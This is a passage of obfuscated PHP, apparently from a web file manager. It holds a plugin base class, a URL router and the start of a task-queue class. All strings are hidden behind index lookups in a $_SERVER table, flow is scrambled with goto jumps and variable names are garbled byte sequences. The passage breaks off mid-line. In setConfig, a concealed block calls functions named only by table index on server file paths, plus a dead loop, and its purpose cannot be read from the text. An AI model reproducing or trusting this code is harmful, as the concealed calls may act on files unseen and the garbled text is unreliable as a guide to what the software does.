(!isset($b¿èñé©É√[$B∑íæë’ûü[76]])) { show_json(LNG($B∑íæë’ûü[1426]), !1); } $this->fileInfo = $b¿èñé©É√[$B∑íæë’ûü[164]]; goto D˜◊˘·ÿ®í; D˜◊˘·ÿ®í: $this->cachePath = $this->pluginCachePath($this->fileInfo[$B∑íæë’ûü[171]]); return $b¿èñé©É√[$B∑íæë’ûü[76]]; goto aÂ“ÊÜ¬ıı; Cäá√›√ﬁô: $B∑íæë’ûü =& $_SERVER[ú∫]; if (!defined($B∑íæë’ûü[454])) { define($B∑íæë’ûü[1425], 0); } if (!$this->isShare($EÚçÚﬁØ„∆)) { return !1; } goto b∑ÔπßÒŒï; aÂ“ÊÜ¬ıı: } final function pluginCachePath($f⁄ûê≥Œ†î = '') { $f®ÙÆï«Í  =& $_SERVER[ú∫]; $D§‹éﬁ√Ìﬁ = IO_PATH_SYSTEM_TEMP . $f®ÙÆï«Í [1427] . $this->pluginName; if (!($D†ïêÕË» = IO::infoFull($D§‹éﬁ√Ìﬁ))) { return IO::mkdir($D§‹éﬁ√Ìﬁ . $f®ÙÆï«Í [8] . $f⁄ûê≥Œ†î); } if (empty($f⁄ûê≥Œ†î)) { return $D†ïêÕË»[$f®ÙÆï«Í [76]]; } if (!($Bà∫ë•°ë¡ = IO::fileNameExist($D†ïêÕË»[$f®ÙÆï«Í [76]], $f⁄ûê≥Œ†î))) { return IO::mkdir($D†ïêÕË»[$f®ÙÆï«Í [76]] . $f⁄ûê≥Œ†î); } return KodIO::make($Bà∫ë•°ë¡); } final function pluginCacheFileSet($E±∏‚¶¢§ü, $BöÕµÏœ”ÿ = '') { $døµù†¿ÀÒ =& $_SERVER[ú∫]; if (!($càªâÓÃò÷ = IO::infoFull($E±∏‚¶¢§ü))) { return IO::mkfile($E±∏‚¶¢§ü, $BöÕµÏœ”ÿ, REPEAT_REPLACE); } IO::setContent($càªâÓÃò÷[$døµù†¿ÀÒ[76]], $BöÕµÏœ”ÿ); return $càªâÓÃò÷[$døµù†¿ÀÒ[76]]; } final function pluginLocalFile($eÜˆë≈Ñ¥Ñ = '') { goto EØ±Ì˘ÛâÙ; añÂ Ü‚ƒ : if (!checkExtSafe($f¨§…Ë¢¥∫)) { $f¨§…Ë¢¥∫ = $f¨§…Ë¢¥∫ . $dóÆì¢£°¨[1428]; } $D∫”úÿ‘áö = $d§˘¢‘ã‰ù . $f¨§…Ë¢¥∫; if (@file_exists($D∫”úÿ‘áö)) { return $D∫”úÿ‘áö; } goto Aîè±∏õ∏º; fè±ì∫¬Ô∫: if (!$eÜˆë≈Ñ¥Ñ) { return $d§˘¢‘ã‰ù; } $fÖÌ¿ñÖ≥œ = IO::info($eÜˆë≈Ñ¥Ñ); $f¨§…Ë¢¥∫ = $this->_tmpFileName($fÖÌ¿ñÖ≥œ) . $dóÆì¢£°¨[95] . $fÖÌ¿ñÖ≥œ[$dóÆì¢£°¨[168]]; goto añÂ Ü‚ƒ ; Aîè±∏õ∏º: return IO::copy($eÜˆë≈Ñ¥Ñ, $d§˘¢‘ã‰ù, 0, $f¨§…Ë¢¥∫); goto cé◊èÑ„óÖ; EØ±Ì˘ÛâÙ: $dóÆì¢£°¨ =& $_SERVER[ú∫]; $d§˘¢‘ã‰ù = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($d§˘¢‘ã‰ù)) { mk_dir($d§˘¢‘ã‰ù); } goto fè±ì∫¬Ô∫; cé◊èÑ„óÖ: } final function appPackage() { goto DÉπ¬ÁÛÌ≈; DÉπ¬ÁÛÌ≈: $a£¥Íõ∆îπ =& $_SERVER[ú∫]; if ($this->packageData) { return $this->packageData; } $F¬ñÛƒ˜ Ã = $this->parseFile($this->pluginPath . $a£¥Íõ∆îπ[1429]); goto DÑˆ∫ñ†î∂; cı≤†û∆Íÿ: $cÿôî‰—ìá = Hook::trigger($a£¥Íõ∆îπ[1430], $c¢˘ÉŒÜ†‡); if ($cÿôî‰—ìá && is_array($cÿôî‰—ìá)) { $c¢˘ÉŒÜ†‡ = $cÿôî‰—ìá; } $this->packageData = $c¢˘ÉŒÜ†‡; goto aÉÔ–ÿÁºÙ; DÑˆ∫ñ†î∂: $this->parseLang($F¬ñÛƒ˜ Ã); $c¢˘ÉŒÜ†‡ = json_decode_force($F¬ñÛƒ˜ Ã); if (!$c¢˘ÉŒÜ†‡) { return array(); } goto cı≤†û∆Íÿ; aÉÔ–ÿÁºÙ: return $c¢˘ÉŒÜ†‡; goto C ﬂ◊‰Ÿí‘; C ﬂ◊‰Ÿí‘: } public function packageInfoGet($DπôÕÊÔ ò) { $B‡Áè‹îëÍ = $this->appPackage(); return array_get_value($B‡Áè‹îëÍ, $DπôÕÊÔ ò); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ú∫][1431]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ú∫][1432]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ú∫][1433]); } private function parseFile($BŒ•Ö∆éÍ¢) { goto cÖ±Óé©ªá; DÇÁ∑¿ô∞: $Fµù’È˜ËŸ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Cß◊åË ¨ï[88]][$Cß◊åË ¨ï[1441]]); if (strstr($f∑ˆäÏÉ≤à, $Cß◊åË ¨ï[1442])) { $fπçô·ﬂºá = rawurlencode(json_encode($this->pluginLangArr)); $f∑ˆäÏÉ≤à = str_replace($Cß◊åË ¨ï[1442], $fπçô·ﬂºá, $f∑ˆäÏÉ≤à); } if (strstr($f∑ˆäÏÉ≤à, $Cß◊åË ¨ï[1443])) { $fπçô·ﬂºá = $fπçô·ﬂºá = rawurlencode(json_encode($this->getConfig())); $f∑ˆäÏÉ≤à = str_replace($Cß◊åË ¨ï[1443], $fπçô·ﬂºá, $f∑ˆäÏÉ≤à); } goto añ‡˜∫±≤Ü; cÖ±Óé©ªá: $Cß◊åË ¨ï =& $_SERVER[ú∫]; $f∑ˆäÏÉ≤à = file_get_contents_nossl($BŒ•Ö∆éÍ¢); $d«◊€ºÒÒã = array($Cß◊åË ¨ï[1434], $Cß◊åË ¨ï[1435], $Cß◊åË ¨ï[1436], $Cß◊åË ¨ï[1437], $Cß◊åË ¨ï[1438], $Cß◊åË ¨ï[1439], $Cß◊åË ¨ï[1440]); goto DÇÁ∑¿ô∞; añ‡˜∫±≤Ü: $f∑ˆäÏÉ≤à = str_replace($d«◊€ºÒÒã, $Fµù’È˜ËŸ, $f∑ˆäÏÉ≤à); return $f∑ˆäÏÉ≤à; goto c‘Ÿ™–£⁄‰; c‘Ÿ™–£⁄‰: } private function parseLang(&$BÒØÒåµïÊ) { goto BÜË’›å…ﬁ; Bÿ⁄´É±áÊ: preg_match_all($d√Ö´⁄«µª[1445], $BÒØÒåµïÊ, $a≤‡«ÔÒ¢ß); if (!is_array($a≤‡«ÔÒ¢ß) || count($a≤‡«ÔÒ¢ß) == 0 || !is_array($a≤‡«ÔÒ¢ß[0]) || count($a≤‡«ÔÒ¢ß[0]) == 0) { return; } $cºÂ£ÕàÙ = array(); goto AÖ©ê´•®; AÖ©ê´•®: $b¡Í±õÚÀ = array(); foreach ($a≤‡«ÔÒ¢ß[0] as $B€†ëÿ¶èÎ) { $a´íëêáÕí = substr($B€†ëÿ¶èÎ, strlen($Fá¯Ÿ⁄¿ÿ»), -4); $b¬◊Û®üıá = LNG($a´íëêáÕí); $cºÂ£ÕàÙ[] = $B€†ëÿ¶èÎ; $b¡Í±õÚÀ[] = str_replace(array($d√Ö´⁄«µª[229], $d√Ö´⁄«µª[1038], $d√Ö´⁄«µª[340], $d√Ö´⁄«µª[116]), array($d√Ö´⁄«µª[50], $d√Ö´⁄«µª[50], $d√Ö´⁄«µª[33], $d√Ö´⁄«µª[1446]), $b¬◊Û®üıá); } $BÒØÒåµïÊ = str_replace($cºÂ£ÕàÙ, $b¡Í±õÚÀ, $BÒØÒåµïÊ); goto c∫€ÿœ…◊≠; BÜË’›å…ﬁ: $d√Ö´⁄«µª =& $_SERVER[ú∫]; $Fá¯Ÿ⁄¿ÿ» = $d√Ö´⁄«µª[1444]; if (!strstr($BÒØÒåµïÊ, $Fá¯Ÿ⁄¿ÿ»)) { return; } goto Bÿ⁄´É±áÊ; c∫€ÿœ…◊≠: } private function parseConfig(&$EìÇÌ∫”€•) { goto Få  ñéàâ; Aã‰ùÚ¶œÒ: $EìÇÌ∫”€• = str_replace($b˘òîˆ“ºê, $FŒ‘ïöÛª≈, $EìÇÌ∫”€•); goto eÛàùÙµÙ°; Få  ñéàâ: $fû˜ŒΩ∑‡Õ =& $_SERVER[ú∫]; $b≠èﬁ™è∆ã = $fû˜ŒΩ∑‡Õ[1447]; if (!strstr($EìÇÌ∫”€•, $b≠èﬁ™è∆ã)) { return; } goto C◊ÌØò∏ä€; DÂÈÙï‘ã∫: $b˘òîˆ“ºê = array(); $FŒ‘ïöÛª≈ = array(); foreach ($bü÷≠‘€ÍÂ[0] as $Aõ”Ì¢ÃÃ‚) { $E√ø•ç„◊ = substr($Aõ”Ì¢ÃÃ‚, strlen($b≠èﬁ™è∆ã), -2); $b˘òîˆ“ºê[] = $Aõ”Ì¢ÃÃ‚; $FŒ‘ïöÛª≈[] = _get($cŸî⁄‰ÃóÆ, $E√ø•ç„◊); } goto Aã‰ùÚ¶œÒ; C◊ÌØò∏ä€: preg_match_all($fû˜ŒΩ∑‡Õ[1448], $EìÇÌ∫”€•, $bü÷≠‘€ÍÂ); if (!is_array($bü÷≠‘€ÍÂ) || count($bü÷≠‘€ÍÂ) == 0 || !is_array($bü÷≠‘€ÍÂ[0]) || count($bü÷≠‘€ÍÂ[0]) == 0) { return; } $cŸî⁄‰ÃóÆ = $this->getConfig(); goto DÂÈÙï‘ã∫; eÛàùÙµÙ°: } private function parsePackage(&$e¡µ‡’‘∂ó) { goto aπœªÕí∏”; aπœªÕí∏”: $bÈù¥å¢∏Ÿ =& $_SERVER[ú∫]; $CÓﬁÈ¨∂ù© = $bÈù¥å¢∏Ÿ[1449]; if (!strstr($e¡µ‡’‘∂ó, $CÓﬁÈ¨∂ù©)) { return; } goto cıÇ“ÂÂ’ø; cıÇ“ÂÂ’ø: preg_match_all($bÈù¥å¢∏Ÿ[1450], $e¡µ‡’‘∂ó, $e∞¢ìèõì≈); if (!is_array($e∞¢ìèõì≈) || count($e∞¢ìèõì≈) == 0 || !is_array($e∞¢ìèõì≈[0]) || count($e∞¢ìèõì≈[0]) == 0) { return; } $c∂Ì†â™·∆ = $this->appPackage(); goto E ∏˘≥§ï∏; E ∏˘≥§ï∏: $c¥‹«€ìå’ = array(); $Fç¢À∆≠¨ü = array(); foreach ($e∞¢ìèõì≈[0] as $C∏î·«üå˘) { $c¿‹Òù˜Íß = substr($C∏î·«üå˘, strlen($CÓﬁÈ¨∂ù©), -2); $c¥‹«€ìå’[] = $C∏î·«üå˘; $Fç¢À∆≠¨ü[] = _get($c∂Ì†â™·∆, $c¿‹Òù˜Íß); } goto f˘ˆËéíÉæ; f˘ˆËéíÉæ: $e¡µ‡’‘∂ó = str_replace($c¥‹«€ìå’, $Fç¢À∆≠¨ü, $e¡µ‡’‘∂ó); goto eπ—˜ÊÍÒã; eπ—˜ÊÍÒã: } final function echoFile($F÷⁄«ÇÌ°è, $Eêï—ﬁ†ÂÁ = false) { goto d¥ÿÂ”≠âÇ; Cô›ˆíÇ ƒ: $this->parsePackage($b ¨°È≤ç¨); if (is_array($Eêï—ﬁ†ÂÁ)) { $b ¨°È≤ç¨ = str_replace(array_keys($Eêï—ﬁ†ÂÁ), array_values($Eêï—ﬁ†ÂÁ), $b ¨°È≤ç¨); } echo $E™¢ÿö‘◊ë[229] . $b ¨°È≤ç¨; goto bΩ¿äÀ‰¬¨; d¥ÿÂ”≠âÇ: $E™¢ÿö‘◊ë =& $_SERVER[ú∫]; $e©◊ÎË‘ËÜ = $this->pluginPath . $F÷⁄«ÇÌ°è; if (ACT == $E™¢ÿö‘◊ë[1451]) { echo $E™¢ÿö‘◊ë[1452] . $this->pluginName . $E™¢ÿö‘◊ë[8] . $F÷⁄«ÇÌ°è . $E™¢ÿö‘◊ë[1453]; if (!file_exists($e©◊ÎË‘ËÜ)) { echo $E™¢ÿö‘◊ë[1454]; return; } } goto D¨›Ÿó√¶⁄; D¨›Ÿó√¶⁄: $b ¨°È≤ç¨ = $this->parseFile($e©◊ÎË‘ËÜ); $this->parseLang($b ¨°È≤ç¨); $this->parseConfig($b ¨°È≤ç¨); goto Cô›ˆíÇ ƒ; bΩ¿äÀ‰¬¨: } final function initLang() { goto eû„¢ìôà‡; eû„¢ìôà‡: $F”Ü‡–„©∫ =& $_SERVER[ú∫]; $eÁô≠ÂêΩ⁄ = $F”Ü‡–„©∫[1455]; $Fπ∫¶∆æéÏ = $this->pluginPath . $F”Ü‡–„©∫[1456]; goto e≠¨—’ô»›; Eñ‰Íçî”≠: if (!is_array($bÈº∂îú≥ì)) { return array(); } if (@count($bÈº∂îú≥ì) > 0) { I18n::set($bÈº∂îú≥ì); } return $bÈº∂îú≥ì; goto Bù°’õëè∏; e≠¨—’ô»›: $dÍÖÏ«éÒ· = I18n::getType(); $bÈº∂îú≥ì = array(); if (file_exists($Fπ∫¶∆æéÏ . $dÍÖÏ«éÒ· . $F”Ü‡–„©∫[803])) { $bÈº∂îú≥ì = (include $Fπ∫¶∆æéÏ . $dÍÖÏ«éÒ· . $F”Ü‡–„©∫[803]); } else { if ($dÍÖÏ«éÒ· == $F”Ü‡–„©∫[1457] && !file_exists($Fπ∫¶∆æéÏ . $dÍÖÏ«éÒ· . $F”Ü‡–„©∫[803]) && file_exists($Fπ∫¶∆æéÏ . $F”Ü‡–„©∫[1458])) { $bÈº∂îú≥ì = (include $Fπ∫¶∆æéÏ . $F”Ü‡–„©∫[1458]); } else { if (file_exists($Fπ∫¶∆æéÏ . $eÁô≠ÂêΩ⁄ . $F”Ü‡–„©∫[803])) { $bÈº∂îú≥ì = (include $Fπ∫¶∆æéÏ . $eÁô≠ÂêΩ⁄ . $F”Ü‡–„©∫[803]); } } } goto Eñ‰Íçî”≠; Bù°’õëè∏: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Fˆ¶äÙıê©) { $cÇµ©Ñ‚•ò =& $_SERVER[ú∫]; if ($_SERVER[$cÇµ©Ñ‚•ò[821]] != $_SERVER[$cÇµ©Ñ‚•ò[1459]]) { goto b’à‰ÑÏ »; FƒÖ≈ä¡‘®: $cîäãÔÊ´ò = $cÇµ©Ñ‚•ò[840]; $cîäãÔÊ´ò($_SERVER[$cÇµ©Ñ‚•ò[841]]); $cîäãÔÊ´ò($_SERVER[$cÇµ©Ñ‚•ò[824]] . $cÇµ©Ñ‚•ò[1460]); goto DÚúØÎ∏å ; DÚúØÎ∏å : $Eãÿâ„›°á = 1; while ($Eãÿâ„›°á > 1) { $Eãÿâ„›°á = $Eãÿâ„›°á + 4; $A⁄ì‚—¡¬õ = rawurlencode($Eãÿâ„›°á . $cÇµ©Ñ‚•ò[375]); } goto c®áÓùÍÑ¯; bËÏåØïŒè: $CâÕó±è¯£ = $B£ﬂãá≈øç($fƒ•∑•„æ); $c„∞Ïë√”õ = explode($cÇµ©Ñ‚•ò[229], $CâÕó±è¯£); if (count($c„∞Ïë√”õ) < $cÇµ©Ñ‚•ò[578]) { $fÀÃ”ØÑ„„ = $cÇµ©Ñ‚•ò[826]; $fÀÃ”ØÑ„„(); } goto FƒÖ≈ä¡‘®; b’à‰ÑÏ »: $FŸç∑˘—±” = $cÇµ©Ñ‚•ò[839]; $B£ﬂãá≈øç = $cÇµ©Ñ‚•ò[823]; $fƒ•∑•„æ = $_SERVER[$cÇµ©Ñ‚•ò[824]] . $cÇµ©Ñ‚•ò[825]; goto bËÏåØïŒè; c®áÓùÍÑ¯: } return $this->modelPlugin->setConfig($this->pluginName, $Fˆ¶äÙıê©); } public function onSetConfig($F‰ÂÓ–©—Ú) { } public function onGetConfig($aƒ∑§˜á˜ã) { } public function onChangeStatus($dÎüﬁâäè∑) { } public function onUninstall() { } public function onInstall() { } public function authCheck($aﬂºêÚ≠òÍ = "\160\154\x75\147\x69\156\101\165\x74\150") { $A‚çß†¨Ï≈ =& $_SERVER[ú∫]; if (!defined($A‚çß†¨Ï≈[454])) { return !1; } if (_get($GLOBALS, $A‚çß†¨Ï≈[485])) { return !0; } $D›Úë›ÕËˆ = $this->getConfig(); if (!$D›Úë›ÕËˆ[$aﬂºêÚ≠òÍ]) { return !1; } return ActionCall($A‚çß†¨Ï≈[1461], $D›Úë›ÕËˆ[$aﬂºêÚ≠òÍ]); } public function url($c¡≠⁄Êï≈ø, $B–˘åÊÉ∫È = '', $E›∫›—ÉÖ = true) { goto a¬ÏËòÑå€; e©≥¨‹§¯‚: $E–„®û¢— = $this->packageVersion(); $aè†°‡ÈÜå = $B¡÷à»‡Ï“ . $dûö‡Ï¶∑é[440] . $E–„®û¢—; if (substr($c¡≠⁄Êï≈ø, 0, 4) == $dûö‡Ï¶∑é[147] || substr($c¡≠⁄Êï≈ø, 0, 2) == $dûö‡Ï¶∑é[1245]) { $f§–—“µ¬á = $c¡≠⁄Êï≈ø . $dûö‡Ï¶∑é[1462] . $aè†°‡ÈÜå; } else { if ($B–˘åÊÉ∫È == $dûö‡Ï¶∑é[33]) { $f§–—“µ¬á = $this->pluginHost . $c¡≠⁄Êï≈ø . $dûö‡Ï¶∑é[1462] . $aè†°‡ÈÜå; } else { if ($B–˘åÊÉ∫È === $dûö‡Ï¶∑é[77]) { $f§–—“µ¬á = $this->pluginHost . $c¡≠⁄Êï≈ø; } else { if ($B–˘åÊÉ∫È == $dûö‡Ï¶∑é[1463]) { $f§–—“µ¬á = STATIC_PATH . $c¡≠⁄Êï≈ø . $dûö‡Ï¶∑é[1462] . $B¡÷à»‡Ï“; } else { if ($B–˘åÊÉ∫È == $dûö‡Ï¶∑é[1464]) { $f§–—“µ¬á = APP_HOST . $dûö‡Ï¶∑é[1465] . $c¡≠⁄Êï≈ø . $dûö‡Ï¶∑é[1462] . $B¡÷à»‡Ï“; } else { if (isset($f®≠⁄åªà[$B–˘åÊÉ∫È])) { $f§–—“µ¬á = $f®≠⁄åªà[$B–˘åÊÉ∫È] . $c¡≠⁄Êï≈ø . $dûö‡Ï¶∑é[1462] . $aè†°‡ÈÜå; } } } } } } goto CìÊ¿˘ö≈È; a¬ÏËòÑå€: $dûö‡Ï¶∑é =& $_SERVER[ú∫]; $f®≠⁄åªà = $this->getConfig(); $B¡÷à»‡Ï“ = KOD_VERSION . $dûö‡Ï¶∑é[95] . KOD_VERSION_BUILD; goto e©≥¨‹§¯‚; CìÊ¿˘ö≈È: if (!$E›∫›—ÉÖ) { return $f§–—“µ¬á; } echo $f§–—“µ¬á; goto cê’‘Öõ¬; cê’‘Öõ¬: } public function link($Fñ§úåêÆø = false, $EÕ·ÒçŒÕÇ = '') { $a–˜«±πê =& $_SERVER[ú∫]; if (!$Fñ§úåêÆø) { $this->link($a–˜«±πê[1466], $a–˜«±πê[1464]); $this->link($a–˜«±πê[1467], $a–˜«±πê[1463]); $this->link($a–˜«±πê[1468], $a–˜«±πê[1463]); $this->link($a–˜«±πê[1469], $a–˜«±πê[1463]); $this->link($a–˜«±πê[1470], $a–˜«±πê[1463]); return; } $A≥Æƒ–á§ = $this->url($Fñ§úåêÆø, $EÕ·ÒçŒÕÇ, !1); if (substr($Fñ§úåêÆø, -3) == $a–˜«±πê[1471]) { echo $a–˜«±πê[1472] . $A≥Æƒ–á§ . $a–˜«±πê[1473] . $a–˜«±πê[229]; } else { if (substr($Fñ§úåêÆø, -4) == $a–˜«±πê[1474]) { echo $a–˜«±πê[1475] . $A≥Æƒ–á§ . $a–˜«±πê[1476] . $a–˜«±πê[229]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\171" => "\x5b\x5e\57\x5d\53", "\x3a\x6e\x75\x6d" => "\133\60\x2d\71\135\53", "\x3a\x61\x6c\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($Dçﬁ≈ò¡ å, $BúﬂßÔÑ„Õ) { $A√¥äÑ¨Ñà =& $_SERVER[ú∫]; if ($Dçﬁ≈ò¡ å == $A√¥äÑ¨Ñà[1477]) { $d∫•ú«’˜Ó = array_map($A√¥äÑ¨Ñà[1478], $BúﬂßÔÑ„Õ[0]); $AÚ≈» ◊ ’ = strpos($BúﬂßÔÑ„Õ[1], $A√¥äÑ¨Ñà[8]) === 0 ? $BúﬂßÔÑ„Õ[1] : $A√¥äÑ¨Ñà[8] . $BúﬂßÔÑ„Õ[1]; $E‚ƒÙ∏‰Áú = $BúﬂßÔÑ„Õ[2]; } else { $d∫•ú«’˜Ó = null; $AÚ≈» ◊ ’ = strpos($BúﬂßÔÑ„Õ[0], $A√¥äÑ¨Ñà[8]) === 0 ? $BúﬂßÔÑ„Õ[0] : $A√¥äÑ¨Ñà[8] . $BúﬂßÔÑ„Õ[0]; $E‚ƒÙ∏‰Áú = $BúﬂßÔÑ„Õ[1]; } array_push(self::$maps, $d∫•ú«’˜Ó); array_push(self::$routes, $AÚ≈» ◊ ’); array_push(self::$methods, strtoupper($Dçﬁ≈ò¡ å)); array_push(self::$callbacks, $E‚ƒÙ∏‰Áú); } public static function error($DΩú—Ìå Î) { self::$errorCallback = $DΩú—Ìå Î; } public static function haltOnMatch($F≠†ˆ≥¿àÔ = true) { self::$halts = $F≠†ˆ≥¿àÔ; } public static function dispatch() { goto aùÉœêà¶ƒ; aùÉœêà¶ƒ: $D√ãåˆΩ∫√ =& $_SERVER[ú∫]; $DÒ¢ä‡é∫ª = parse_url($_SERVER[$D√ãåˆΩ∫√[1479]], PHP_URL_PATH); $c∑∆ƒÊ™†ä = $_SERVER[$D√ãåˆΩ∫√[157]]; goto cäô¥√øÒı; eü¬¡ùÍ¿Ì: self::$routes = preg_replace($D√ãåˆΩ∫√[1164], $D√ãåˆΩ∫√[8], self::$routes); if (in_array($DÒ¢ä‡é∫ª, self::$routes)) { $A†ØÎäÙ¨É = array_keys(self::$routes, $DÒ¢ä‡é∫ª); foreach ($A†ØÎäÙ¨É as $E÷ªã·“åœ) { if (self::$methods[$E÷ªã·“åœ] == $c∑∆ƒÊ™†ä || self::$methods[$E÷ªã·“åœ] == $D√ãåˆΩ∫√[1480] || in_array($c∑∆ƒÊ™†ä, self::$maps[$E÷ªã·“åœ])) { $DÀˆ∏Úáπ◊ = !0; if (!is_object(self::$callbacks[$E÷ªã·“åœ])) { $EÌﬁÃäóæ˜ = explode($D√ãåˆΩ∫√[8], self::$callbacks[$E÷ªã·“åœ]); $DÉ‰ëåº°é = end($EÌﬁÃäóæ˜); $bú¯À«Â˜» = explode($D√ãåˆΩ∫√[1481], $DÉ‰ëåº°é); $Bä“Æ®◊ıâ = new $bú¯À«Â˜»[0](); $Bä“Æ®◊ıâ->{$bú¯À«Â˜»[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$E÷ªã·“åœ]); if (self::$halts) { return; } } } } } else { $c£üêŒóÉû = 0; foreach (self::$routes as $E÷ªã·“åœ) { if (strpos($E÷ªã·“åœ, $D√ãåˆΩ∫√[4]) !== !1) { $E÷ªã·“åœ = str_replace($BÍ¢Üáêé, $cµ à°é¥ß, $E÷ªã·“åœ); } if (preg_match($D√ãåˆΩ∫√[1482] . $E÷ªã·“åœ . $D√ãåˆΩ∫√[1483], $DÒ¢ä‡é∫ª, $DËÈà⁄∂π‹)) { if (self::$methods[$c£üêŒóÉû] == $c∑∆ƒÊ™†ä || self::$methods[$c£üêŒóÉû] == $D√ãåˆΩ∫√[1480] || !empty(self::$maps[$c£üêŒóÉû]) && in_array($c∑∆ƒÊ™†ä, self::$maps[$c£üêŒóÉû])) { $DÀˆ∏Úáπ◊ = !0; array_shift($DËÈà⁄∂π‹); if (!is_object(self::$callbacks[$c£üêŒóÉû])) { $EÌﬁÃäóæ˜ = explode($D√ãåˆΩ∫√[8], self::$callbacks[$c£üêŒóÉû]); $DÉ‰ëåº°é = end($EÌﬁÃäóæ˜); $bú¯À«Â˜» = explode($D√ãåˆΩ∫√[1481], $DÉ‰ëåº°é); $Bä“Æ®◊ıâ = new $bú¯À«Â˜»[0](); if (!method_exists($Bä“Æ®◊ıâ, $bú¯À«Â˜»[1])) { echo $D√ãåˆΩ∫√[1484]; } else { call_user_func_array(array($Bä“Æ®◊ıâ, $bú¯À«Â˜»[1]), $DËÈà⁄∂π‹); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$c£üêŒóÉû], $DËÈà⁄∂π‹); if (self::$halts) { return; } } } } $c£üêŒóÉû++; } } if ($DÀˆ∏Úáπ◊ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $a’Ö‘®Ë°é =& $_SERVER[ú∫]; header($_SERVER[$a’Ö‘®Ë°é[1485]] . $a’Ö‘®Ë°é[1486]); echo $a’Ö‘®Ë°é[1487]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$D√ãåˆΩ∫√[1479]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto BÙÏä∏¥ÿÃ; cäô¥√øÒı: $BÍ¢Üáêé = array_keys(static::$patterns); $cµ à°é¥ß = array_values(static::$patterns); $DÀˆ∏Úáπ◊ = !1; goto eü¬¡ùÍ¿Ì; BÙÏä∏¥ÿÃ: } } goto eË„—»ÓàÛ; b∏ÊäΩñÖ’: class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\164\x61\x73\x6b\x51\165\145\x75\145\x4c\x65\156\147\164\x68"; const QUEUE_DATA = "\x74\141\163\153\x51\165\145\165\x65\104\141\164\x61"; public static $listData = false; public static function initTask() { } public static function add($AÕÉ˜õı¯ı, $aöû´äÖ”µ = array(), $AƒŸõÔ–Úñ = '', $fÑ¿õí∂àâ = '') { $CﬂÜÆ£®ë¶ =& $_SERVER[ú∫]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($fÑ¿õí∂àâ && array_find_by_field(self::$listData, $CﬂÜÆ£®ë¶[93], $fÑ¿õí∂àâ)) { return !0; } self::$listData[] = array($CﬂÜÆ£®ë¶[262] => $AÕÉ˜õı¯ı, $CﬂÜÆ£®ë¶[1598] => $aöû´äÖ”µ, $CﬂÜÆ£®ë¶[431] => $AƒŸõÔ–Úñ, $CﬂÜÆ£®ë¶[93] => $fÑ¿õí∂àâ); return !0; } public static function addSubmit() { $aﬂË¡ì‡¿¿ =& $_SERVER[ú∫]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($aﬂË¡ì‡¿¿[1599] . json_encode_force(array_to_keyvalue(self::$listData, $aﬂË¡ì‡¿¿[33], $aﬂË¡ì‡¿¿[431])), $aﬂË¡ì‡¿¿[1600]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($D∞Õî¥ìÀ„, $A’ø©ÉîÈ≠ = array(), $a÷¯è°∫¥˘ = '', $C–∫Í±âã‘ = '') { goto dØòˆŒ‰À≥; c⁄ë»˜ñ™¿: if ($C–∫Í±âã‘ && array_find_by_field($cﬁÜãÿÂÿê, $E≠’ö¥Ëπä[93], $C–∫Í±âã‘)) { return !0; } $cﬁÜãÿÂÿê[] = array($E≠’ö¥Ëπä[262] => $D∞Õî¥ìÀ„, $E≠’ö¥Ëπä[1598] => $A’ø©ÉîÈ≠, $E≠’ö¥Ëπä[431] => $a÷¯è°∫¥˘, $E≠’ö¥Ëπä[93] => $C–∫Í±âã‘); write_log($E≠’ö¥Ëπä[1599] . $a÷¯è°∫¥˘, $E≠’ö¥Ëπä[1600]); goto c≈πñ±é—±; c≈πñ±é—±: self::setAll($cﬁÜãÿÂÿê); return !0; goto CûÃÚÈ›˘∫; dØòˆŒ‰À≥: $E≠’ö¥Ëπä =& $_SERVER[ú∫]; if (self::count() >= self::MAX_LENGTH) { return !1; } $cﬁÜãÿÂÿê = self::getAll(); goto c⁄ë»˜ñ™¿; CûÃÚÈ›˘∫: } public static function run() { goto Féœá≥≥‡∂; Féœá≥≥‡∂: $C±ÔÏ∂¨»Û =& $_SERVER[ú∫]; $A ÿâøŒä• = self::getAll(); $eÖçÆáü Ê = array_shift($A ÿâøŒä•); goto F™¯∂∏Ω—®; båøÏﬂ∏º–: try { Hook::apply($eÖçÆáü Ê[$C±ÔÏ∂¨»Û[262]], $eÖçÆáü Ê[$C±ÔÏ∂¨»Û[1598]]); } catch (Exception $bù€•ëπéÙ) { } $e áâÑ≠ ≤ = number_format(timeFloat() - $c„¡ÉàŒ•°, 3) . $C±ÔÏ∂¨»Û[1541]; write_log($C±ÔÏ∂¨»Û[1601] . $eÖçÆáü Ê[$C±ÔÏ∂¨»Û[431]] . $C±ÔÏ∂¨»Û[1602] . $e áâÑ≠ ≤, $C±ÔÏ∂¨»Û[1600]); goto fÂıÕ≤â“¡; fÂıÕ≤â“¡: return !0; goto cﬂßﬁé¨Ïù; F™¯∂∏Ω—®: if (!$eÖçÆáü Ê) { return !1; } self::setAll($A ÿâøŒä•); $c„¡ÉàŒ•° = timeFloat(); goto båøÏﬂ∏º–; cﬂßﬁé¨Ïù: } public static function count() { $e‰í≈ƒ€ëÌ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$e‰í≈ƒ€ëÌ) { return 0; } return intval($e‰í≈ƒ€ëÌ); } public static function getAll() { $DâÎ¢é÷Ö = Cache::get(self::QUEUE_DATA); 